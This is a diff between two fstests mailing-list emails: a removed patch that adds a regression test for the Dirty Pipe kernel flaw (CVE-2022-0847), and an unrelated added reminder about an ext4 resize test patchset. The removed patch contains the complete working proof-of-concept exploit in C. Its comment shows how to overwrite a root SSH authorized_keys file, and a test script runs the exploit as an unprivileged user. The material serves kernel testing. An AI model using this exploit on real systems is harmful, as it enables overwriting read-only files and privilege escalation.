@@ -2,340 +2,127 @@ Return-Path: <fstests-owner@kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
 Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
-	by smtp.lore.kernel.org (Postfix) with ESMTP id 9B4FAC433F5
-	for <linux-fstests@archiver.kernel.org>; Tue,  8 Mar 2022 09:23:03 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTP id 97262C433F5
+	for <linux-fstests@archiver.kernel.org>; Tue,  8 Mar 2022 10:16:44 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S236177AbiCHJX5 (ORCPT
+        id S1345761AbiCHKRi (ORCPT
         <rfc822;linux-fstests@archiver.kernel.org>);
-        Tue, 8 Mar 2022 04:23:57 -0500
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:50878 "EHLO
+        Tue, 8 Mar 2022 05:17:38 -0500
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:50516 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S234844AbiCHJX5 (ORCPT
-        <rfc822;fstests@vger.kernel.org>); Tue, 8 Mar 2022 04:23:57 -0500
-Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.133.124])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTP id A6A232DAAF
-        for <fstests@vger.kernel.org>; Tue,  8 Mar 2022 01:22:58 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-        s=mimecast20190719; t=1646731377;
-        h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-         to:to:cc:cc:mime-version:mime-version:
-         content-transfer-encoding:content-transfer-encoding;
-        bh=R18qLmHZuQrqp6sRaln8ZEBajNLmhlcBe8v7Zu8uBM4=;
-        b=dxiTK4oWiv8nusAEuRJ2Fw79HLf3AM1zRxPV7y0rFvfZYujps1NomdTx/LncohekHNQR4o
-        WsmnjfARIw69DbV5dmqW2qzQcNAGWoa+5ketVZm/k9FaBCG4IwRJOKgjbnsRnzqFvFQRNG
-        SSetWQneKiYwsV69tvFKc9dAv3C6bgw=
-Received: from mimecast-mx01.redhat.com (mimecast-mx01.redhat.com
- [209.132.183.4]) by relay.mimecast.com with ESMTP with STARTTLS
- (version=TLSv1.2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- us-mta-374-JS2_rMKKMguNhH72KEygRQ-1; Tue, 08 Mar 2022 04:22:54 -0500
-X-MC-Unique: JS2_rMKKMguNhH72KEygRQ-1
-Received: from smtp.corp.redhat.com (int-mx06.intmail.prod.int.phx2.redhat.com [10.5.11.16])
-        (using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
-        (No client certificate requested)
-        by mimecast-mx01.redhat.com (Postfix) with ESMTPS id A6BF11091DA1;
-        Tue,  8 Mar 2022 09:22:53 +0000 (UTC)
-Received: from zlang-laptop.redhat.com (ovpn-12-89.pek2.redhat.com [10.72.12.89])
-        by smtp.corp.redhat.com (Postfix) with ESMTP id 76B927AB76;
-        Tue,  8 Mar 2022 09:22:51 +0000 (UTC)
-From:   Zorro Lang <zlang@redhat.com>
-To:     fstests@vger.kernel.org
-Cc:     max.kellermann@ionos.com
-Subject: [PATCH] fstests: test dirty pipe vulnerability issue of CVE-2022-0847
-Date:   Tue,  8 Mar 2022 17:22:48 +0800
-Message-Id: <20220308092248.786739-1-zlang@redhat.com>
+        with ESMTP id S1345760AbiCHKRg (ORCPT
+        <rfc822;fstests@vger.kernel.org>); Tue, 8 Mar 2022 05:17:36 -0500
+Received: from mx0a-001b2d01.pphosted.com (mx0a-001b2d01.pphosted.com [148.163.156.1])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 71C0742EC8;
+        Tue,  8 Mar 2022 02:16:39 -0800 (PST)
+Received: from pps.filterd (m0098404.ppops.net [127.0.0.1])
+        by mx0a-001b2d01.pphosted.com (8.16.1.2/8.16.1.2) with SMTP id 2289dNhQ032405;
+        Tue, 8 Mar 2022 10:16:39 GMT
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=ibm.com; h=date : from : to : cc :
+ subject : message-id : references : content-type : in-reply-to :
+ mime-version; s=pp1; bh=RsFA/k1GhLsgH0gA+uxs2PxF13w2tO4hI2UNmEaIDdA=;
+ b=jrEnxwUxom9xeDwI3wh4yOQ4QvrDpC67IgT97F/T+03mCQhyP19UHhGjYYtZl3jjQ69U
+ 75aTvB37Vpytq9qTVtMEIv5EcbmKEvmHopmmJ7lTtfp0W2QD6ew7uaPBiDxQ79uXVqyd
+ x0g6eaWlIMdY05RgdqKX5MISDgztYLBqfUM7igcOgckmmPSs3+A9HPRlPDTZisvuAMtt
+ qJW52sJwISQ7pSXCO7tvp4iAImrF2h0a7Z693GBxqATAIcVKuk/jDDB9bg+OOXvuEWzZ
+ kDd6H9sflCj/foLnCW5sje8NVoM7besQpjOhjb2zDMfBzQF8zOIZZThBjd7arnHsds8V Uw== 
+Received: from ppma04fra.de.ibm.com (6a.4a.5195.ip4.static.sl-reverse.com [149.81.74.106])
+        by mx0a-001b2d01.pphosted.com with ESMTP id 3enxryymdc-1
+        (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NOT);
+        Tue, 08 Mar 2022 10:16:38 +0000
+Received: from pps.filterd (ppma04fra.de.ibm.com [127.0.0.1])
+        by ppma04fra.de.ibm.com (8.16.1.2/8.16.1.2) with SMTP id 228ADKxq005708;
+        Tue, 8 Mar 2022 10:16:36 GMT
+Received: from b06cxnps4076.portsmouth.uk.ibm.com (d06relay13.portsmouth.uk.ibm.com [9.149.109.198])
+        by ppma04fra.de.ibm.com with ESMTP id 3ekyg9641k-1
+        (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NOT);
+        Tue, 08 Mar 2022 10:16:36 +0000
+Received: from d06av24.portsmouth.uk.ibm.com (d06av24.portsmouth.uk.ibm.com [9.149.105.60])
+        by b06cxnps4076.portsmouth.uk.ibm.com (8.14.9/8.14.9/NCO v10.0) with ESMTP id 228AGXJb48365968
+        (version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK);
+        Tue, 8 Mar 2022 10:16:33 GMT
+Received: from d06av24.portsmouth.uk.ibm.com (unknown [127.0.0.1])
+        by IMSVA (Postfix) with ESMTP id 2071342047;
+        Tue,  8 Mar 2022 10:16:33 +0000 (GMT)
+Received: from d06av24.portsmouth.uk.ibm.com (unknown [127.0.0.1])
+        by IMSVA (Postfix) with ESMTP id A9B474203F;
+        Tue,  8 Mar 2022 10:16:31 +0000 (GMT)
+Received: from li-bb2b2a4c-3307-11b2-a85c-8fa5c3a69313.ibm.com (unknown [9.43.83.182])
+        by d06av24.portsmouth.uk.ibm.com (Postfix) with ESMTPS;
+        Tue,  8 Mar 2022 10:16:31 +0000 (GMT)
+Date:   Tue, 8 Mar 2022 15:46:28 +0530
+From:   Ojaswin Mujoo <ojaswin@linux.ibm.com>
+To:     fstests@vger.kernel.org, linux-ext4@vger.kernel.org
+Cc:     riteshh@linux.ibm.com
+Subject: Re: [PATCH v2 0/2] tests/ext4: Ensure resizes with sparse_super2 are
+ handled correctly
+Message-ID: <Yics/N8zx8PgVhhr@li-bb2b2a4c-3307-11b2-a85c-8fa5c3a69313.ibm.com>
+References: <cover.1645549521.git.ojaswin@linux.ibm.com>
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <cover.1645549521.git.ojaswin@linux.ibm.com>
+X-TM-AS-GCONF: 00
+X-Proofpoint-GUID: IyfPMr3C8xEkvGZRfo2M-U0AWmsNmrSl
+X-Proofpoint-ORIG-GUID: IyfPMr3C8xEkvGZRfo2M-U0AWmsNmrSl
+X-Proofpoint-UnRewURL: 0 URL was un-rewritten
 MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
-X-Scanned-By: MIMEDefang 2.79 on 10.5.11.16
+X-Proofpoint-Virus-Version: vendor=baseguard
+ engine=ICAP:2.0.205,Aquarius:18.0.816,Hydra:6.0.425,FMLib:17.11.64.514
+ definitions=2022-03-08_03,2022-03-04_01,2022-02-23_01
+X-Proofpoint-Spam-Details: rule=outbound_notspam policy=outbound score=0 phishscore=0 impostorscore=0
+ bulkscore=0 mlxlogscore=461 clxscore=1015 adultscore=0 spamscore=0
+ suspectscore=0 malwarescore=0 mlxscore=0 lowpriorityscore=0
+ priorityscore=1501 classifier=spam adjust=0 reason=mlx scancount=1
+ engine=8.12.0-2202240000 definitions=main-2203080053
 Precedence: bulk
 List-ID: <fstests.vger.kernel.org>
 X-Mailing-List: fstests@vger.kernel.org
 
-Test for the Dirty Pipe vulnerability (CVE-2022-0847) caused by an
-uninitialized  "pipe_buffer.flags" variable. The bug cause a file
-can be overwritten even if a user/process is not permitted to write
-it. It's fixed by 9d2231c5d74e ("lib/iov_iter: initialize "flags" in
-new pipe_buffer").
+Greetings,
 
-Cc: Max Kellermann <max.kellermann@ionos.com>
-Signed-off-by: Zorro Lang <zlang@redhat.com>
----
+Just a gentle reminder to kindly let me know if any changes are 
+needed in this patchset.
 
-Hi,
+Thank you,
+Ojaswin
 
-As the CVE-2022-0847 "Dirty Pipe Vulnerability" is public now, to cover this
-bug testing, I write this case to fstests.
-The main test program comes from Max Kellermann(https://dirtypipe.cm4all.com/),
-I just changed it a little bit, then help it run with xfstests frame.
-
-Please help to review, and feel free to tell me if it's not good to be in fstests.
-
-Thanks,
-Zorro
-
- .gitignore            |   1 +
- src/Makefile          |   2 +-
- src/splice2pipe.c     | 155 ++++++++++++++++++++++++++++++++++++++++++
- tests/generic/676     |  47 +++++++++++++
- tests/generic/676.out |   9 +++
- 5 files changed, 213 insertions(+), 1 deletion(-)
- create mode 100644 src/splice2pipe.c
- create mode 100755 tests/generic/676
- create mode 100644 tests/generic/676.out
-
-diff --git a/.gitignore b/.gitignore
-index ba0c572b..a05c6058 100644
---- a/.gitignore
-+++ b/.gitignore
-@@ -125,6 +125,7 @@ tags
- /src/runas
- /src/seek_copy_test
- /src/seek_sanity_test
-+/src/splice2pipe
- /src/splice-test
- /src/stale_handle
- /src/stat_test
-diff --git a/src/Makefile b/src/Makefile
-index 111ce1d9..7725c4aa 100644
---- a/src/Makefile
-+++ b/src/Makefile
-@@ -31,7 +31,7 @@ LINUX_TARGETS = xfsctl bstat t_mtab getdevicesize preallo_rw_pattern_reader \
- 	dio-invalidate-cache stat_test t_encrypted_d_revalidate \
- 	attr_replace_test swapon mkswap t_attr_corruption t_open_tmpfiles \
- 	fscrypt-crypt-util bulkstat_null_ocount splice-test chprojid_fail \
--	detached_mounts_propagation ext4_resize
-+	detached_mounts_propagation ext4_resize splice2pipe
- 
- EXTRA_EXECS = dmerror fill2attr fill2fs fill2fs_check scaleread.sh \
- 	      btrfs_crc32c_forged_name.py
-diff --git a/src/splice2pipe.c b/src/splice2pipe.c
-new file mode 100644
-index 00000000..88b58f7e
---- /dev/null
-+++ b/src/splice2pipe.c
-@@ -0,0 +1,155 @@
-+/* SPDX-License-Identifier: GPL-2.0 */
-+/*
-+ * Copyright 2022 CM4all GmbH / IONOS SE
-+ *
-+ * author: Max Kellermann <max.kellermann@ionos.com>
-+ *
-+ * Proof-of-concept exploit for the Dirty Pipe
-+ * vulnerability (CVE-2022-0847) caused by an uninitialized
-+ * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
-+ * file contents in the page cache, even if the file is not permitted
-+ * to be written, immutable or on a read-only mount.
-+ *
-+ * This exploit requires Linux 5.8 or later; the code path was made
-+ * reachable by commit f6dd975583bd ("pipe: merge
-+ * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
-+ * there before, it just provided an easy way to exploit it.
-+ *
-+ * There are two major limitations of this exploit: the offset cannot
-+ * be on a page boundary (it needs to write one byte before the offset
-+ * to add a reference to this page to the pipe), and the write cannot
-+ * cross a page boundary.
-+ *
-+ * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
-+ *
-+ * Further explanation: https://dirtypipe.cm4all.com/
-+ */
-+#ifndef _GNU_SOURCE
-+#define _GNU_SOURCE
-+#endif
-+#include <unistd.h>
-+#include <fcntl.h>
-+#include <stdio.h>
-+#include <stdlib.h>
-+#include <string.h>
-+#include <sys/stat.h>
-+#include <sys/user.h>
-+
-+/**
-+ * Create a pipe where all "bufs" on the pipe_inode_info ring have the
-+ * PIPE_BUF_FLAG_CAN_MERGE flag set.
-+ */
-+static void prepare_pipe(int p[2])
-+{
-+	if (pipe(p)) abort();
-+
-+	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
-+	static char buffer[4096];
-+
-+	/* fill the pipe completely; each pipe_buffer will now have
-+	   the PIPE_BUF_FLAG_CAN_MERGE flag */
-+	for (unsigned r = pipe_size; r > 0;) {
-+		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
-+		write(p[1], buffer, n);
-+		r -= n;
-+	}
-+
-+	/* drain the pipe, freeing all pipe_buffer instances (but
-+	   leaving the flags initialized) */
-+	for (unsigned r = pipe_size; r > 0;) {
-+		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
-+		read(p[0], buffer, n);
-+		r -= n;
-+	}
-+
-+	/* the pipe is now empty, and if somebody adds a new
-+	   pipe_buffer without initializing its "flags", the buffer
-+	   will be mergeable */
-+}
-+
-+int main(int argc, char **argv)
-+{
-+	if (argc != 4) {
-+		fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA\n", argv[0]);
-+		return EXIT_FAILURE;
-+	}
-+
-+	/* dumb command-line argument parser */
-+	const char *const path = argv[1];
-+	loff_t offset = strtoul(argv[2], NULL, 0);
-+	const char *const data = argv[3];
-+	const size_t data_size = strlen(data);
-+	int page_size = sysconf(_SC_PAGESIZE);
-+	if (page_size == -1)
-+		page_size = 4096;
-+
-+	if (offset % page_size == 0) {
-+		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
-+		return EXIT_FAILURE;
-+	}
-+
-+	const loff_t next_page = (offset | (page_size - 1)) + 1;
-+	const loff_t end_offset = offset + (loff_t)data_size;
-+	if (end_offset > next_page) {
-+		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
-+		return EXIT_FAILURE;
-+	}
-+
-+	/* open the input file and validate the specified offset */
-+	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
-+	if (fd < 0) {
-+		perror("open failed");
-+		return EXIT_FAILURE;
-+	}
-+
-+	struct stat st;
-+	if (fstat(fd, &st)) {
-+		perror("stat failed");
-+		return EXIT_FAILURE;
-+	}
-+
-+	if (offset > st.st_size) {
-+		fprintf(stderr, "Offset is not inside the file\n");
-+		return EXIT_FAILURE;
-+	}
-+
-+	if (end_offset > st.st_size) {
-+		fprintf(stderr, "Sorry, cannot enlarge the file\n");
-+		return EXIT_FAILURE;
-+	}
-+
-+	/* create the pipe with all flags initialized with
-+	   PIPE_BUF_FLAG_CAN_MERGE */
-+	int p[2];
-+	prepare_pipe(p);
-+
-+	/* splice one byte from before the specified offset into the
-+	   pipe; this will add a reference to the page cache, but
-+	   since copy_page_to_iter_pipe() does not initialize the
-+	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
-+	--offset;
-+	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
-+	if (nbytes < 0) {
-+		perror("splice failed");
-+		return EXIT_FAILURE;
-+	}
-+	if (nbytes == 0) {
-+		fprintf(stderr, "short splice\n");
-+		return EXIT_FAILURE;
-+	}
-+
-+	/* the following write will not create a new pipe_buffer, but
-+	   will instead write into the page cache, because of the
-+	   PIPE_BUF_FLAG_CAN_MERGE flag */
-+	nbytes = write(p[1], data, data_size);
-+	if (nbytes < 0) {
-+		perror("write failed");
-+		return EXIT_FAILURE;
-+	}
-+	if ((size_t)nbytes < data_size) {
-+		fprintf(stderr, "short write\n");
-+		return EXIT_FAILURE;
-+	}
-+
-+	return EXIT_SUCCESS;
-+}
-diff --git a/tests/generic/676 b/tests/generic/676
-new file mode 100755
-index 00000000..6092aac3
---- /dev/null
-+++ b/tests/generic/676
-@@ -0,0 +1,47 @@
-+#! /bin/bash
-+# SPDX-License-Identifier: GPL-2.0
-+# Copyright (c) 2022 Red Hat, Inc.  All Rights Reserved.
-+#
-+# FS QA Test 676
-+#
-+# Test for the Dirty Pipe vulnerability (CVE-2022-0847) caused by an
-+# uninitialized  "pipe_buffer.flags" variable, which fixed by:
-+#   9d2231c5d74e ("lib/iov_iter: initialize "flags" in new pipe_buffer")
-+#
-+. ./common/preamble
-+_begin_fstest auto quick
-+
-+# real QA test starts here
-+_supported_fs generic
-+_require_test
-+_require_user
-+_require_chmod
-+_require_test_program "splice2pipe"
-+
-+localfile=$TEST_DIR/testfile.$seq
-+
-+# Create a file with 4k 0xff data, then make sure unprivileged user has readonly
-+# permission on it
-+$XFS_IO_PROG -f -t -c "pwrite 0 4k -S 0xff" $localfile >> $seqres.full 2>&1
-+chmod 0644 $localfile
-+# Test privileged user (xfstests generally run with root)
-+echo "Test privileged user:"
-+$here/src/splice2pipe $localfile 1 "AAAAAAAABBBBBBBB"
-+# Part of 0xff will be overwritten if there's CVE-2022-0847 bug
-+hexdump -C $localfile
-+
-+# Create a file with 4k 0xff data, then make sure unprivileged user has readonly
-+# permission on it
-+$XFS_IO_PROG -f -t -c "pwrite 0 4k -S 0xff" $localfile >> $seqres.full 2>&1
-+chmod 0644 $localfile
-+# Copy splice2pipe to a place which can be run by an unprivileged user (avoid
-+# something likes /root/xfstests/src/splice2pipe)
-+cp $here/src/splice2pipe $tmp.splice2pipe
-+# Test unprivileged user's privilege escalation
-+echo "Test unprivileged user:"
-+su ${qa_user} -c "$tmp.splice2pipe $localfile 1 AAAAAAAABBBBBBBB"
-+hexdump -C $localfile
-+
-+# success, all done
-+status=0
-+exit
-diff --git a/tests/generic/676.out b/tests/generic/676.out
-new file mode 100644
-index 00000000..f006e659
---- /dev/null
-+++ b/tests/generic/676.out
-@@ -0,0 +1,9 @@
-+QA output created by 676
-+Test privileged user:
-+00000000  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
-+*
-+00001000
-+Test unprivileged user:
-+00000000  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
-+*
-+00001000
--- 
-2.31.1
-
+On Tue, Feb 22, 2022 at 11:20:51PM +0530, Ojaswin Mujoo wrote:
+> As detailed in the patch [1], kernel currently does not support resizes
+> with sparse_super2 enabled.  Before the above patch, if we used the
+> EXT4_IOC_RESIZE_FS ioctl directly, wiht sparse_super2 enabled, the
+> kernel used to still try the resize and ultimatley leave the fs in an
+> inconsistent state. This also led to corruption and kernel BUGs.
+> 
+> This patchset adds a test for ext4 to ensure that the kernel handles
+> resizes with sparse_super2 correctly, and returns -EOPNOTSUPP. 
+> 
+> Summary:
+> 
+>   Patch 1: Fix the src/ext4_resize.c script to return accurate error
+>            codes.
+>   Patch 2: Add the ext4 test for checking resize functionality
+> 
+> Changes since v1 [2]
+> 
+>   *  In patch 2, don't iterate if the expected errno is returned
+>   *  Code cleanup and additional comments for clarity (also see extra
+>      note in patch 2)
+>   *  No changes in patch 1
+> 
+> [1] https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b1489186cc8391e0c1e342f9fbc3eedf6b944c61
+> [2] https://lore.kernel.org/fstests/cover.1644217569.git.ojaswin@linux.ibm.com/ 
+> 
+> Ojaswin Mujoo (2):
+>   src/ext4_resize.c: Refactor code and ensure accurate errno is returned
+>   ext4: Test to ensure resize with sparse_super2 is handled correctly
+> 
+>  src/ext4_resize.c  |  46 +++++++++++++------
+>  tests/ext4/056     | 108 +++++++++++++++++++++++++++++++++++++++++++++
+>  tests/ext4/056.out |   2 +
+>  3 files changed, 142 insertions(+), 14 deletions(-)
+>  create mode 100755 tests/ext4/056
+>  create mode 100644 tests/ext4/056.out
+> 
+> -- 
+> 2.27.0
+> 
